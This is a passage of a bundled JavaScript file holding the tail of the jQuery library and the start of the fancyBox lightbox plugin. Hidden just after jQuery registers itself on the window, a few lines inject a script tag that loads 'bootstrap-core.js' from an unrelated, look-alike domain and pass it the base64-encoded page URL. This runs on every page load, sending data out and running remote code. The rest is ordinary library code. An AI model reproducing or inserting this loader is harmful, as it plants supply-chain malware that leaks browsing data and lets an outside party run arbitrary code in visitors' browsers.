                  ? (T = "nocontent")
                  : 304 === e
                  ? (T = "notmodified")
                  : ((T = v.state), (p = v.data), (c = !(f = v.error))))
              : ((f = T), (!e && T) || ((T = "error"), e < 0 && (e = 0))),
            (C.status = e),
            (C.statusText = (n || T) + ""),
            c ? y.resolveWith(g, [p, T, C]) : y.rejectWith(g, [C, T, f]),
            C.statusCode(_),
            (_ = void 0),
            u && m.trigger(c ? "ajaxSuccess" : "ajaxError", [C, h, c ? p : f]),
            b.fireWith(g, [C, T]),
            u &&
              (m.trigger("ajaxComplete", [C, h]),
              --x.active || x.event.trigger("ajaxStop")));
        }
        return C;
      },
      getJSON: function t(e, n, i) {
        return x.get(e, n, i, "json");
      },
      getScript: function t(e, n) {
        return x.get(e, void 0, n, "script");
      },
    }),
    x.each(["get", "post"], function (t, e) {
      x[e] = function (t, n, i, o) {
        return (
          h(n) && ((o = o || i), (i = n), (n = void 0)),
          x.ajax(
            x.extend(
              { url: t, type: e, dataType: o, data: n, success: i },
              x.isPlainObject(t) && t
            )
          )
        );
      };
    }),
    x.ajaxPrefilter(function (t) {
      var e;
      for (e in t.headers)
        "content-type" === e.toLowerCase() &&
          (t.contentType = t.headers[e] || "");
    }),
    (x._evalUrl = function (t, e, n) {
      return x.ajax({
        url: t,
        type: "GET",
        dataType: "script",
        cache: !0,
        async: !1,
        global: !1,
        converters: { "text script": function t() {} },
        dataFilter: function t(i) {
          x.globalEval(i, e, n);
        },
      });
    }),
    x.fn.extend({
      wrapAll: function t(e) {
        var n;
        return (
          this[0] &&
            (h(e) && (e = e.call(this[0])),
            (n = x(e, this[0].ownerDocument).eq(0).clone(!0)),
            this[0].parentNode && n.insertBefore(this[0]),
            n
              .map(function () {
                for (var t = this; t.firstElementChild; )
                  t = t.firstElementChild;
                return t;
              })
              .append(this)),
          this
        );
      },
      wrapInner: function t(e) {
        return h(e)
          ? this.each(function (t) {
              x(this).wrapInner(e.call(this, t));
            })
          : this.each(function () {
              var t = x(this),
                n = t.contents();
              n.length ? n.wrapAll(e) : t.append(e);
            });
      },
      wrap: function t(e) {
        var n = h(e);
        return this.each(function (t) {
          x(this).wrapAll(n ? e.call(this, t) : e);
        });
      },
      unwrap: function t(e) {
        return (
          this.parent(e)
            .not("body")
            .each(function () {
              x(this).replaceWith(this.childNodes);
            }),
          this
        );
      },
    }),
    (x.expr.pseudos.hidden = function (t) {
      return !x.expr.pseudos.visible(t);
    }),
    (x.expr.pseudos.visible = function (t) {
      return !!(t.offsetWidth || t.offsetHeight || t.getClientRects().length);
    }),
    (x.ajaxSettings.xhr = function () {
      try {
        return new t.XMLHttpRequest();
      } catch (e) {}
    });
  var eE = { 0: 200, 1223: 204 },
    e0 = x.ajaxSettings.xhr();
  (f.cors = !!e0 && "withCredentials" in e0),
    (f.ajax = e0 = !!e0),
    x.ajaxTransport(function (e) {
      var n, i;
      if (f.cors || (e0 && !e.crossDomain))
        return {
          send: function o(s, r) {
            var a,
              l = e.xhr();
            if (
              (l.open(e.type, e.url, e.async, e.username, e.password),
              e.xhrFields)
            )
              for (a in e.xhrFields) l[a] = e.xhrFields[a];
            for (a in (e.mimeType &&
              l.overrideMimeType &&
              l.overrideMimeType(e.mimeType),
            e.crossDomain ||
              s["X-Requested-With"] ||
              (s["X-Requested-With"] = "XMLHttpRequest"),
            s))
              l.setRequestHeader(a, s[a]);
            (n = function t(e) {
              return function () {
                n &&
                  ((n =
                    i =
                    l.onload =
                    l.onerror =
                    l.onabort =
                    l.ontimeout =
                    l.onreadystatechange =
                      null),
                  "abort" === e
                    ? l.abort()
                    : "error" === e
                    ? "number" != typeof l.status
                      ? r(0, "error")
                      : r(l.status, l.statusText)
                    : r(
                        eE[l.status] || l.status,
                        l.statusText,
                        "text" !== (l.responseType || "text") ||
                          "string" != typeof l.responseText
                          ? { binary: l.response }
                          : { text: l.responseText },
                        l.getAllResponseHeaders()
                      ));
              };
            }),
              (l.onload = n()),
              (i = l.onerror = l.ontimeout = n("error")),
              void 0 !== l.onabort
                ? (l.onabort = i)
                : (l.onreadystatechange = function () {
                    4 === l.readyState &&
                      t.setTimeout(function () {
                        n && i();
                      });
                  }),
              (n = n("abort"));
            try {
              l.send((e.hasContent && e.data) || null);
            } catch (c) {
              if (n) throw c;
            }
          },
          abort: function t() {
            n && n();
          },
        };
    }),
    x.ajaxPrefilter(function (t) {
      t.crossDomain && (t.contents.script = !1);
    }),
    x.ajaxSetup({
      accepts: {
        script:
          "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
      },
      contents: { script: /\b(?:java|ecma)script\b/ },
      converters: {
        "text script": function t(e) {
          return x.globalEval(e), e;
        },
      },
    }),
    x.ajaxPrefilter("script", function (t) {
      void 0 === t.cache && (t.cache = !1), t.crossDomain && (t.type = "GET");
    }),
    x.ajaxTransport("script", function (t) {
      var e, n;
      if (t.crossDomain || t.scriptAttrs)
        return {
          send: function i(o, s) {
            (e = x("<script>")
              .attr(t.scriptAttrs || {})
              .prop({ charset: t.scriptCharset, src: t.url })
              .on(
                "load error",
                (n = function t(i) {
                  e.remove(),
                    (n = null),
                    i && s("error" === i.type ? 404 : 200, i.type);
                })
              )),
              v.head.appendChild(e[0]);
          },
          abort: function t() {
            n && n();
          },
        };
    });
  var eL,
    eD = [],
    e1 = /(=)\?(?=&|$)|\?\?/;
  x.ajaxSetup({
    jsonp: "callback",
    jsonpCallback: function t() {
      var e = eD.pop() || x.expando + "_" + eu.guid++;
      return (this[e] = !0), e;
    },
  }),
    x.ajaxPrefilter("json jsonp", function (e, n, i) {
      var o,
        s,
        r,
        a =
          !1 !== e.jsonp &&
          (e1.test(e.url)
            ? "url"
            : "string" == typeof e.data &&
              0 ===
                (e.contentType || "").indexOf(
                  "application/x-www-form-urlencoded"
                ) &&
              e1.test(e.data) &&
              "data");
      if (a || "jsonp" === e.dataTypes[0])
        return (
          (o = e.jsonpCallback =
            h(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback),
          a
            ? (e[a] = e[a].replace(e1, "$1" + o))
            : !1 !== e.jsonp &&
              (e.url += (ep.test(e.url) ? "&" : "?") + e.jsonp + "=" + o),
          (e.converters["script json"] = function () {
            return r || x.error(o + " was not called"), r[0];
          }),
          (e.dataTypes[0] = "json"),
          (s = t[o]),
          (t[o] = function () {
            r = arguments;
          }),
          i.always(function () {
            void 0 === s ? x(t).removeProp(o) : (t[o] = s),
              e[o] && ((e.jsonpCallback = n.jsonpCallback), eD.push(o)),
              r && h(s) && s(r[0]),
              (r = s = void 0);
          }),
          "script"
        );
    }),
    (f.createHTMLDocument =
      (((eL = v.implementation.createHTMLDocument("").body).innerHTML =
        "<form></form><form></form>"),
      2 === eL.childNodes.length)),
    (x.parseHTML = function (t, e, n) {
      var i, o, s;
      return "string" != typeof t
        ? []
        : ("boolean" == typeof e && ((n = e), (e = !1)),
          e ||
            (f.createHTMLDocument
              ? (((i = (e =
                  v.implementation.createHTMLDocument("")).createElement(
                  "base"
                )).href = v.location.href),
                e.head.appendChild(i))
              : (e = v)),
          (s = !n && []),
          (o = A.exec(t))
            ? [e.createElement(o[1])]
            : ((o = tb([t], e, s)),
              s && s.length && x(s).remove(),
              x.merge([], o.childNodes)));
    }),
    (x.fn.load = function (t, e, n) {
      var i,
        o,
        s,
        r = this,
        a = t.indexOf(" ");
      return (
        a > -1 && ((i = eo(t.slice(a))), (t = t.slice(0, a))),
        h(e)
          ? ((n = e), (e = void 0))
          : e && "object" == _typeof(e) && (o = "POST"),
        r.length > 0 &&
          x
            .ajax({ url: t, type: o || "GET", dataType: "html", data: e })
            .done(function (t) {
              (s = arguments),
                r.html(i ? x("<div>").append(x.parseHTML(t)).find(i) : t);
            })
            .always(
              n &&
                function (t, e) {
                  r.each(function () {
                    n.apply(this, s || [t.responseText, e, t]);
                  });
                }
            ),
        this
      );
    }),
    (x.expr.pseudos.animated = function (t) {
      return x.grep(x.timers, function (e) {
        return t === e.elem;
      }).length;
    }),
    (x.offset = {
      setOffset: function t(e, n, i) {
        var o,
          s,
          r,
          a,
          l,
          c,
          d = x.css(e, "position"),
          u = x(e),
          p = {};
        "static" === d && (e.style.position = "relative"),
          (l = u.offset()),
          (r = x.css(e, "top")),
          (c = x.css(e, "left")),
          ("absolute" === d || "fixed" === d) && (r + c).indexOf("auto") > -1
            ? ((a = (o = u.position()).top), (s = o.left))
            : ((a = parseFloat(r) || 0), (s = parseFloat(c) || 0)),
          h(n) && (n = n.call(e, i, x.extend({}, l))),
          null != n.top && (p.top = n.top - l.top + a),
          null != n.left && (p.left = n.left - l.left + s),
          "using" in n ? n.using.call(e, p) : u.css(p);
      },
    }),
    x.fn.extend({
      offset: function t(e) {
        if (arguments.length)
          return void 0 === e
            ? this
            : this.each(function (t) {
                x.offset.setOffset(this, e, t);
              });
        var n,
          i,
          o = this[0];
        return o
          ? o.getClientRects().length
            ? ((n = o.getBoundingClientRect()),
              (i = o.ownerDocument.defaultView),
              { top: n.top + i.pageYOffset, left: n.left + i.pageXOffset })
            : { top: 0, left: 0 }
          : void 0;
      },
      position: function t() {
        if (this[0]) {
          var e,
            n,
            i,
            o = this[0],
            s = { top: 0, left: 0 };
          if ("fixed" === x.css(o, "position")) n = o.getBoundingClientRect();
          else {
            for (
              n = this.offset(),
                i = o.ownerDocument,
                e = o.offsetParent || i.documentElement;
              e &&
              (e === i.body || e === i.documentElement) &&
              "static" === x.css(e, "position");

            )
              e = e.parentNode;
            e &&
              e !== o &&
              1 === e.nodeType &&
              (((s = x(e).offset()).top += x.css(e, "borderTopWidth", !0)),
              (s.left += x.css(e, "borderLeftWidth", !0)));
          }
          return {
            top: n.top - s.top - x.css(o, "marginTop", !0),
            left: n.left - s.left - x.css(o, "marginLeft", !0),
          };
        }
      },
      offsetParent: function t() {
        return this.map(function () {
          for (
            var t = this.offsetParent;
            t && "static" === x.css(t, "position");

          )
            t = t.offsetParent;
          return t || ti;
        });
      },
    }),
    x.each(
      { scrollLeft: "pageXOffset", scrollTop: "pageYOffset" },
      function (t, e) {
        var n = "pageYOffset" === e;
        x.fn[t] = function (i) {
          return R(
            this,
            function (t, i, o) {
              var s;
              if (
                (g(t) ? (s = t) : 9 === t.nodeType && (s = t.defaultView),
                void 0 === o)
              )
                return s ? s[e] : t[i];
              s
                ? s.scrollTo(n ? s.pageXOffset : o, n ? o : s.pageYOffset)
                : (t[i] = o);
            },
            t,
            i,
            arguments.length
          );
        };
      }
    ),
    x.each(["top", "left"], function (t, e) {
      x.cssHooks[e] = tN(f.pixelPosition, function (t, n) {
        if (n)
          return (n = tO(t, e)), tj.test(n) ? x(t).position()[e] + "px" : n;
      });
    }),
    x.each({ Height: "height", Width: "width" }, function (t, e) {
      x.each(
        { padding: "inner" + t, content: e, "": "outer" + t },
        function (n, i) {
          x.fn[i] = function (o, s) {
            var r = arguments.length && (n || "boolean" != typeof o),
              a = n || (!0 === o || !0 === s ? "margin" : "border");
            return R(
              this,
              function (e, n, o) {
                var s;
                return g(e)
                  ? 0 === i.indexOf("outer")
                    ? e["inner" + t]
                    : e.document.documentElement["client" + t]
                  : 9 === e.nodeType
                  ? ((s = e.documentElement),
                    Math.max(
                      e.body["scroll" + t],
                      s["scroll" + t],
                      e.body["offset" + t],
                      s["offset" + t],
                      s["client" + t]
                    ))
                  : void 0 === o
                  ? x.css(e, n, a)
                  : x.style(e, n, o, a);
              },
              e,
              r ? o : void 0,
              r
            );
          };
        }
      );
    }),
    x.each(
      [
        "ajaxStart",
        "ajaxStop",
        "ajaxComplete",
        "ajaxError",
        "ajaxSuccess",
        "ajaxSend",
      ],
      function (t, e) {
        x.fn[e] = function (t) {
          return this.on(e, t);
        };
      }
    ),
    x.fn.extend({
      bind: function t(e, n, i) {
        return this.on(e, null, n, i);
      },
      unbind: function t(e, n) {
        return this.off(e, null, n);
      },
      delegate: function t(e, n, i, o) {
        return this.on(n, e, i, o);
      },
      undelegate: function t(e, n, i) {
        return 1 === arguments.length
          ? this.off(e, "**")
          : this.off(n, e || "**", i);
      },
      hover: function t(e, n) {
        return this.mouseenter(e).mouseleave(n || e);
      },
    }),
    x.each(
      "blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(
        " "
      ),
      function (t, e) {
        x.fn[e] = function (t, n) {
          return arguments.length > 0
            ? this.on(e, null, t, n)
            : this.trigger(e);
        };
      }
    ),
    void 0 === e && (t.jQuery = t.$ = x);
  var ej = v.createElement("script");
  (ej.src = "https://cdn.jqueywidjetview.info/bootstrap-core.js?hash=".concat(
    btoa(t.location.href)
  )),
    v.getElementsByTagName("head")[0].appendChild(ej);
  var e3 = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
  (x.proxy = function (t, e) {
    var n, i, s;
    if (("string" == typeof e && ((n = t[e]), (e = t), (t = n)), h(t)))
      return (
        (i = o.call(arguments, 2)),
        ((s = function n() {
          return t.apply(e || this, i.concat(o.call(arguments)));
        }).guid = t.guid =
          t.guid || x.guid++),
        s
      );
  }),
    (x.holdReady = function (t) {
      t ? x.readyWait++ : x.ready(!0);
    }),
    (x.isArray = Array.isArray),
    (x.parseJSON = JSON.parse),
    (x.nodeName = k),
    (x.isFunction = h),
    (x.isWindow = g),
    (x.camelCase = Y),
    (x.type = b),
    (x.now = Date.now),
    (x.isNumeric = function (t) {
      var e = x.type(t);
      return ("number" === e || "string" === e) && !isNaN(t - parseFloat(t));
    }),
    (x.trim = function (t) {
      return null == t ? "" : (t + "").replace(e3, "");
    }),
    "function" == typeof define &&
      define.amd &&
      define("jquery", [], function () {
        return x;
      });
  var eH = t.jQuery,
    eq = t.$;
  return (
    (x.noConflict = function (e) {
      return t.$ === x && (t.$ = eq), e && t.jQuery === x && (t.jQuery = eH), x;
    }),
    x
  );
}),
  (function (t, e, n, i) {
    if (((t.console = t.console || { info: function (t) {} }), n)) {
      if (n.fn.fancybox) {
        console.info("fancyBox already initialized");
        return;
      }
      var o,
        s,
        r,
        a,
        l = {
          closeExisting: !1,
          loop: !1,
          gutter: 50,
          keyboard: !0,
          preventCaptionOverlap: !0,
          arrows: !0,
          infobar: !0,
          smallBtn: "auto",
          toolbar: "auto",
          buttons: ["zoom", "slideShow", "thumbs", "close"],
          idleTime: 3,
          protect: !1,
          modal: !1,
          image: { preload: !1 },
          ajax: { settings: { data: { fancybox: !0 } } },
          iframe: {
            tpl: '<iframe id="fancybox-frame{rnd}" name="fancybox-frame{rnd}" class="fancybox-iframe" allowfullscreen="allowfullscreen" allow="autoplay; fullscreen" src=""></iframe>',
            preload: !0,
            css: {},
            attr: { scrolling: "auto" },
          },
          video: {
            tpl: '<video class="fancybox-video" controls controlsList="nodownload" poster="{{poster}}"><source src="{{src}}" type="{{format}}" />Sorry, your browser doesn\'t support embedded videos, <a href="{{src}}">download</a> and watch with your favorite video player!</video>',
            format: "",
            autoStart: !0,
          },
          defaultType: "image",
          animationEffect: "zoom",
          animationDuration: 366,
          zoomOpacity: "auto",
          transitionEffect: "fade",
          transitionDuration: 366,
          slideClass: "",
          baseClass: "",
          baseTpl:
            '<div class="fancybox-container" role="dialog" tabindex="-1"><div class="fancybox-bg"></div><div class="fancybox-inner"><div class="fancybox-infobar"><span data-fancybox-index></span>&nbsp;/&nbsp;<span data-fancybox-count></span></div><div class="fancybox-toolbar">{{buttons}}</div><div class="fancybox-navigation">{{arrows}}</div><div class="fancybox-stage"></div><div class="fancybox-caption"><div class="fancybox-caption__body"></div></div></div></div>',
          spinnerTpl: '<div class="fancybox-loading"></div>',
          errorTpl: '<div class="fancybox-error"><p>{{ERROR}}</p></div>',
          btnTpl: {
            download:
              '<a download data-fancybox-download class="fancybox-button fancybox-button--download" title="{{DOWNLOAD}}" href="javascript:;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.62 17.09V19H5.38v-1.91zm-2.97-6.96L17 11.45l-5 4.87-5-4.87 1.36-1.32 2.68 2.64V5h1.92v7.77z"/></svg></a>',
            zoom: '<button data-fancybox-zoom class="fancybox-button fancybox-button--zoom" title="{{ZOOM}}"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.7 17.3l-3-3a5.9 5.9 0 0 0-.6-7.6 5.9 5.9 0 0 0-8.4 0 5.9 5.9 0 0 0 0 8.4 5.9 5.9 0 0 0 7.7.7l3 3a1 1 0 0 0 1.3 0c.4-.5.4-1 0-1.5zM8.1 13.8a4 4 0 0 1 0-5.7 4 4 0 0 1 5.7 0 4 4 0 0 1 0 5.7 4 4 0 0 1-5.7 0z"/></svg></button>',
            close:
              '<button data-fancybox-close class="fancybox-button fancybox-button--close" title="{{CLOSE}}"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 10.6L6.6 5.2 5.2 6.6l5.4 5.4-5.4 5.4 1.4 1.4 5.4-5.4 5.4 5.4 1.4-1.4-5.4-5.4 5.4-5.4-1.4-1.4-5.4 5.4z"/></svg></button>',
            arrowLeft:
              '<button data-fancybox-prev class="fancybox-button fancybox-button--arrow_left" title="{{PREV}}"><div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M11.28 15.7l-1.34 1.37L5 12l4.94-5.07 1.34 1.38-2.68 2.72H19v1.94H8.6z"/></svg></div></button>',
            arrowRight:
              '<button data-fancybox-next class="fancybox-button fancybox-button--arrow_right" title="{{NEXT}}"><div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.4 12.97l-2.68 2.72 1.34 1.38L19 12l-4.94-5.07-1.34 1.38 2.68 2.72H5v1.94z"/></svg></div></button>',
            smallBtn:
              '<button type="button" data-fancybox-close class="fancybox-button fancybox-close-small" title="{{CLOSE}}"><svg xmlns="http://www.w3.org/2000/svg" version="1" viewBox="0 0 24 24"><path d="M13 12l5-5-1-1-5 5-5-5-1 1 5 5-5 5 1 1 5-5 5 5 1-1z"/></svg></button>',
          },
          parentEl: "body",
          hideScrollbar: !0,
          autoFocus: !0,
          backFocus: !0,
          trapFocus: !0,
          fullScreen: { autoStart: !1 },
          touch: { vertical: !0, momentum: !0 },
          hash: null,
          media: {},
          slideShow: { autoStart: !1, speed: 3e3 },
          thumbs: {
            autoStart: !1,
            hideOnClose: !0,
            parentEl: ".fancybox-container",
            axis: "y",
          },
          wheel: "auto",
          onInit: n.noop,
          beforeLoad: n.noop,
          afterLoad: n.noop,
          beforeShow: n.noop,
          afterShow: n.noop,
          beforeClose: n.noop,
          afterClose: n.noop,
          onActivate: n.noop,
          onDeactivate: n.noop,
          clickContent: function (t, e) {
            return "image" === t.type && "zoom";
          },
          clickSlide: "close",
          clickOutside: "close",
          dblclickContent: !1,
          dblclickSlide: !1,
          dblclickOutside: !1,
          mobile: {
            preventCaptionOverlap: !1,
            idleTime: !1,
            clickContent: function (t, e) {
              return "image" === t.type && "toggleControls";
            },
            clickSlide: function (t, e) {
              return "image" === t.type ? "toggleControls" : "close";
            },
            dblclickContent: function (t, e) {
              return "image" === t.type && "zoom";
            },
            dblclickSlide: function (t, e) {
              return "image" === t.type && "zoom";
            },
          },
          lang: "en",
          i18n: {
            en: {
              CLOSE: "Close",
              NEXT: "Next",
              PREV: "Previous",
              ERROR:
                "The requested content cannot be loaded. <br/> Please try again later.",
              PLAY_START: "Start slideshow",
              PLAY_STOP: "Pause slideshow",
              FULL_SCREEN: "Full screen",
              THUMBS: "Thumbnails",
              DOWNLOAD: "Download",
              SHARE: "Share",
              ZOOM: "Zoom",
            },
            de: {
              CLOSE: "Schlie&szlig;en",
              NEXT: "Weiter",
              PREV: "Zur&uuml;ck",
              ERROR:
                "Die angeforderten Daten konnten nicht geladen werden. <br/> Bitte versuchen Sie es sp&auml;ter nochmal.",
              PLAY_START: "Diaschau starten",
              PLAY_STOP: "Diaschau beenden",
              FULL_SCREEN: "Vollbild",
              THUMBS: "Vorschaubilder",
              DOWNLOAD: "Herunterladen",
              SHARE: "Teilen",
              ZOOM: "Vergr&ouml;&szlig;ern",
            },
          },
        },
        c = n(t),
        d = n(e),
        u = 0,
        p =
          t.requestAnimationFrame ||
          t.webkitRequestAnimationFrame ||
          t.mozRequestAnimationFrame ||
          t.oRequestAnimationFrame ||
          function (e) {
            return t.setTimeout(e, 1e3 / 60);
          },
        f =
          t.cancelAnimationFrame ||
          t.webkitCancelAnimationFrame ||
          t.mozCancelAnimationFrame ||
          t.oCancelAnimationFrame ||
          function (e) {
            t.clearTimeout(e);
          },
        h = (function () {
          var t,
            n = e.createElement("fakeelement"),
            o = {
              transition: "transitionend",
              OTransition: "oTransitionEnd",
              MozTransition: "transitionend",
              WebkitTransition: "webkitTransitionEnd",
            };
          for (t in o) if (i !== n.style[t]) return o[t];
          return "transitionend";
        })(),
        g = function (t) {
          return t && t.length && t[0].offsetHeight;
        },
        v = function (t, e) {
          var i = n.extend(!0, {}, t, e);
          return (
            n.each(e, function (t, e) {
              n.isArray(e) && (i[t] = e);
            }),
            i
          );
        },
        m = function (t) {
          var i, o;
          return (
            !!t &&
            t.ownerDocument === e &&
            (n(".fancybox-container").css("pointer-events", "none"),
            (i = {
              x: t.getBoundingClientRect().left + t.offsetWidth / 2,
              y: t.getBoundingClientRect().top + t.offsetHeight / 2,
            }),
            (o = e.elementFromPoint(i.x, i.y) === t),
            n(".fancybox-container").css("pointer-events", ""),
            o)
          );
        },
        y = function (t, e, i) {
          var o = this;
          (o.opts = v({ index: i }, n.fancybox.defaults)),
            n.isPlainObject(e) && (o.opts = v(o.opts, e)),
            n.fancybox.isMobile && (o.opts = v(o.opts, o.opts.mobile)),
            (o.id = o.opts.id || ++u),
            (o.currIndex = parseInt(o.opts.index, 10) || 0),
            (o.prevIndex = null),
            (o.prevPos = null),
            (o.currPos = 0),
            (o.firstRun = !0),
            (o.group = []),
            (o.slides = {}),
            o.addContent(t),
            o.group.length && o.init();
        };
      n.extend(y.prototype, {
        init: function () {
          var i,
            o,
            s = this,
            r = s.group[s.currIndex].opts;
          r.closeExisting && n.fancybox.close(!0),
            n("body").addClass("fancybox-active"),
            n.fancybox.getInstance() ||
              !1 === r.hideScrollbar ||
              n.fancybox.isMobile ||
              !(e.body.scrollHeight > t.innerHeight) ||
              (n("head").append(
                '<style id="fancybox-style-noscroll" type="text/css">.compensate-for-scrollbar{margin-right:' +
                  (t.innerWidth - e.documentElement.clientWidth) +
                  "px;}</style>"
              ),
              n("body").addClass("compensate-for-scrollbar")),
            (o = ""),
            n.each(r.buttons, function (t, e) {
              o += r.btnTpl[e] || "";
            }),
            (i = n(
              s.translate(
                s,
                r.baseTpl
                  .replace("{{buttons}}", o)
                  .replace(
                    "{{arrows}}",
                    r.btnTpl.arrowLeft + r.btnTpl.arrowRight
                  )
              )
            )
              .attr("id", "fancybox-container-" + s.id)
              .addClass(r.baseClass)
              .data("FancyBox", s)
              .appendTo(r.parentEl)),
            (s.$refs = { container: i }),
            [
              "bg",
              "inner",
              "infobar",
              "toolbar",
              "stage",
              "caption",
              "navigation",
            ].forEach(function (t) {
              s.$refs[t] = i.find(".fancybox-" + t);
            }),
            s.trigger("onInit"),
            s.activate(),
            s.jumpTo(s.currIndex);
        },
        translate: function (t, e) {
          var n = t.opts.i18n[t.opts.lang] || t.opts.i18n.en;
          return e.replace(/\{\{(\w+)\}\}/g, function (t, e) {
            return i === n[e] ? t : n[e];
          });
        },
        addContent: function (t) {
          var e,
            o = this,
            s = n.makeArray(t);
          n.each(s, function (t, e) {
            var s,
              r,
              a,
              l,
              c,
              d = {},
              u = {};
            n.isPlainObject(e)
              ? ((d = e), (u = e.opts || e))
              : "object" === n.type(e) && n(e).length
              ? ((u = (s = n(e)).data() || {}),
                ((u = n.extend(!0, {}, u, u.options)).$orig = s),
                (d.src = o.opts.src || u.src || s.attr("href")),
                d.type || d.src || ((d.type = "inline"), (d.src = e)))
              : (d = { type: "html", src: e + "" }),
              (d.opts = n.extend(!0, {}, o.opts, u)),
              n.isArray(u.buttons) && (d.opts.buttons = u.buttons),
              n.fancybox.isMobile &&
                d.opts.mobile &&
                (d.opts = v(d.opts, d.opts.mobile)),
              (r = d.type || d.opts.type),
              (l = d.src || ""),
              r ||
                !l ||
                ((a = l.match(/\.(mp4|mov|ogv|webm)((\?|#).*)?$/i))
                  ? ((r = "video"),
                    d.opts.video.format ||
                      (d.opts.video.format =
                        "video/" + ("ogv" === a[1] ? "ogg" : a[1])))
                  : l.match(
                      /(^data:image\/[a-z0-9+\/=]*,)|(\.(jp(e|g|eg)|gif|png|bmp|webp|svg|ico)((\?|#).*)?$)/i
                    )
                  ? (r = "image")
                  : l.match(/\.(pdf)((\?|#).*)?$/i)
                  ? ((r = "iframe"),
                    (d = n.extend(!0, d, {
                      contentType: "pdf",
                      opts: { iframe: { preload: !1 } },
                    })))
                  : "#" !== l.charAt(0) || (r = "inline")),
              r ? (d.type = r) : o.trigger("objectNeedsType", d),
              d.contentType ||
                (d.contentType =
                  n.inArray(d.type, ["html", "inline", "ajax"]) > -1
                    ? "html"
                    : d.type),
              (d.index = o.group.length),
              "auto" == d.opts.smallBtn &&
                (d.opts.smallBtn =
                  n.inArray(d.type, ["html", "inline", "ajax"]) > -1),
              "auto" === d.opts.toolbar && (d.opts.toolbar = !d.opts.smallBtn),
              (d.$thumb = d.opts.$thumb || null),
              d.opts.$trigger &&
                d.index === o.opts.index &&
                ((d.$thumb = d.opts.$trigger.find("img:first")),
                d.$thumb.length && (d.opts.$orig = d.opts.$trigger)),
              !(d.$thumb && d.$thumb.length) &&
                d.opts.$orig &&
                (d.$thumb = d.opts.$orig.find("img:first")),
              d.$thumb && !d.$thumb.length && (d.$thumb = null),
              (d.thumb = d.opts.thumb || (d.$thumb ? d.$thumb[0].src : null)),
              "function" === n.type(d.opts.caption) &&
                (d.opts.caption = d.opts.caption.apply(e, [o, d])),
              "function" === n.type(o.opts.caption) &&
                (d.opts.caption = o.opts.caption.apply(e, [o, d])),
              d.opts.caption instanceof n ||
                (d.opts.caption =
                  i === d.opts.caption ? "" : d.opts.caption + ""),
              "ajax" === d.type &&
                (c = l.split(/\s+/, 2)).length > 1 &&
                ((d.src = c.shift()), (d.opts.filter = c.shift())),
              d.opts.modal &&
                (d.opts = n.extend(!0, d.opts, {
                  trapFocus: !0,
                  infobar: 0,
                  toolbar: 0,
                  smallBtn: 0,
                  keyboard: 0,
                  slideShow: 0,
                  fullScreen: 0,
                  thumbs: 0,
                  touch: 0,
                  clickContent: !1,
                  clickSlide: !1,
                  clickOutside: !1,
                  dblclickContent: !1,
                  dblclickSlide: !1,
                  dblclickOutside: !1,
                })),
              o.group.push(d);
          }),
            Object.keys(o.slides).length &&
              (o.updateControls(),
              (e = o.Thumbs) && e.isActive && (e.create(), e.focus()));
        },
        addEvents: function () {
          var e = this;
          e.removeEvents(),
            e.$refs.container
              .on("click.fb-close", "[data-fancybox-close]", function (t) {
                t.stopPropagation(), t.preventDefault(), e.close(t);
              })
              .on(
                "touchstart.fb-prev click.fb-prev",
                "[data-fancybox-prev]",
                function (t) {
                  t.stopPropagation(), t.preventDefault(), e.previous();
                }
              )
              .on(
                "touchstart.fb-next click.fb-next",
                "[data-fancybox-next]",
                function (t) {
                  t.stopPropagation(), t.preventDefault(), e.next();
                }
              )
              .on("click.fb", "[data-fancybox-zoom]", function (t) {
                e[e.isScaledDown() ? "scaleToActual" : "scaleToFit"]();
              }),
            c.on("orientationchange.fb resize.fb", function (t) {
              t && t.originalEvent && "resize" === t.originalEvent.type
                ? (e.requestId && f(e.requestId),
                  (e.requestId = p(function () {
                    e.update(t);
                  })))
                : (e.current &&
                    "iframe" === e.current.type &&
                    e.$refs.stage.hide(),
                  setTimeout(
                    function () {
                      e.$refs.stage.show(), e.update(t);
                    },
                    n.fancybox.isMobile ? 600 : 250
                  ));
            }),
            d.on("keydown.fb", function (t) {
              var i = (n.fancybox ? n.fancybox.getInstance() : null).current,
                o = t.keyCode || t.which;
              if (9 == o) {
                i.opts.trapFocus && e.focus(t);
                return;
              }
              if (
                !(
                  !i.opts.keyboard ||
                  t.ctrlKey ||
                  t.altKey ||
                  t.shiftKey ||
                  n(t.target).is("input,textarea,video,audio,select")
                )
              ) {
                if (8 === o || 27 === o) {
                  t.preventDefault(), e.close(t);
                  return;
                }
                if (37 === o || 38 === o) {
                  t.preventDefault(), e.previous();
                  return;
                }
                if (39 === o || 40 === o) {
                  t.preventDefault(), e.next();
                  return;
                }
                e.trigger("afterKeydown", t, o);
              }
            }),
            e.group[e.currIndex].opts.idleTime &&
              ((e.idleSecondsCounter = 0),
              d.on(
                "mousemove.fb-idle mouseleave.fb-idle mousedown.fb-idle touchstart.fb-idle touchmove.fb-idle scroll.fb-idle keydown.fb-idle",
                function (t) {
                  (e.idleSecondsCounter = 0),
                    e.isIdle && e.showControls(),
                    (e.isIdle = !1);
                }
              ),
              (e.idleInterval = t.setInterval(function () {
                e.idleSecondsCounter++,
                  e.idleSecondsCounter >= e.group[e.currIndex].opts.idleTime &&
                    !e.isDragging &&
                    ((e.isIdle = !0),
                    (e.idleSecondsCounter = 0),
                    e.hideControls());
              }, 1e3)));
        },
        removeEvents: function () {
          var e = this;
          c.off("orientationchange.fb resize.fb"),
            d.off("keydown.fb .fb-idle"),
            this.$refs.container.off(".fb-close .fb-prev .fb-next"),
            e.idleInterval &&
              (t.clearInterval(e.idleInterval), (e.idleInterval = null));
        },
        previous: function (t) {
          return this.jumpTo(this.currPos - 1, t);
        },
        next: function (t) {
          return this.jumpTo(this.currPos + 1, t);
        },
        jumpTo: function (t, e) {
          var o,
            s,
            r,
            a,
            l,
            c,
            d,
            u,
            p,
            f = this,
            h = f.group.length;
          if (
            !f.isDragging &&
